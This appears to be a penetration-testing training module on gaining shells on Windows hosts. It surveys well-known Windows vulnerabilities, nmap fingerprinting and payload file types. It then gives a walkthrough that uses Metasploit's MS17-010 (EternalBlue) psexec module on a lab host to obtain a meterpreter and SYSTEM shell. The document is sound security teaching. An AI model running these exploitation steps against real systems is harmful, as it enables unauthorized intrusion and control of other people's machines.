## Prominent Windows Exploits
|**Vulnerability**|**Description**|
|---|---|
|`MS08-067`|MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.|
|`Eternal Blue`|MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.|
|`PrintNightmare`|A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).|
|`BlueKeep`|CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.|
|`Sigred`|CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.|
|`SeriousSam`|CVE 2021-36934 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.|
|`Zerologon`|CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.|

## Enumerating Windows & Fingerprinting Methods
Since we have a set of targets, `what are a few ways to determine if the host is likely a Windows Machine`? To answer this question, we can look at a few things. The first one being the `Time To Live` (TTL) counter when utilizing ICMP to determine if the host is up. A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see.
Check out this [link](https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.

Another way we can validate if the host is Windows or not is to use our handy tool, `NMAP`. Nmap has a cool capability built in to help with OS identification and many other scripted scans to check for anything from a specific vulnerability to information gathered from SNMP. For this example, we will utilize the `-O` option with verbose output `-v` to initialize an OS Identification scan against our target `192.168.86.39`. If you run into issues and the scans turn up little results, attempt again with the `-A` and `-Pn` options. This will perform a different scan and may work.
Now that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called `banner.nse`.

#### Banner Grab to Enumerate Ports
```shell
$ sudo nmap -v 192.168.86.39 --script banner.nse
```

Now that we have discussed fingerprinting let's look at several file types and what they can be used for when building out payloads.

## Bats, DLLs, & MSI Files, Oh My!
When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use.
#### Payload Types to Consider
- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
    
- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.
    
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
    
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
    
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.

## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
Below you will find examples of different payload generation methods and ways to transfer our payloads to the victim. We will talk about some of these methods at a high level since our focus is on the payload generation itself and the different ways to acquire a shell on the target.

#### Payload Transfer and Execution:
- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

## Example Compromise Walkthrough
#### Enumerate the Host

```shell
$ nmap -v -A 10.129.201.97

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0

```

It is running `Windows Server 2016 Standard 6.3`. We have the hostname now, and we know it is not in a domain and is running several services.
MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

#### Determine an Exploit Path

```shell
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 

#SET OPTIONS

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
```

The target is vulnerable.
#### Configure The Exploit & Payload

```shell
msf6 exploit(windows/smb/ms17_010_psexec) > options
```
Be sure to set your payload options correctly before running the exploit. Any options that have `Required` set to yes will be a necessary space to fill. In this instance, we need to ensure that our `RHOSTS, LHOST, and LPORT` fields are correctly set. For this attempt, accepting the defaults for the rest is OK.

```shell
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
meterpreter >
```

#### Identify Our Shell
```shell
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
 If we were dropped into PowerShell, our prompt would look like `PS C:\Windows\system32>`.

## CMD-Prompt and Power[Shell]s for Fun and Profit.
We are fortunate with Windows hosts to have not one but two choices for shells to utilize by default. Now you may be wondering:

`Which one is the right one to use?`

CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host.
Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET.

Use `CMD` when:
- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:
- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.

## WSL and PowerShell For Linux
The Windows Subsystem for Linux is a powerful new tool that has been introduced to Windows hosts that provides a virtual Linux environment built into your host.
We mention this because the rapidly changing landscape of operating systems may very well allow for novel ways of gaining access to a host.
One other thing to note is currently, any network requests or functions executed to or from the WSL instance are not parsed by the Windows Firewall and Windows Defender, making it a bit of a blind spot on the host.
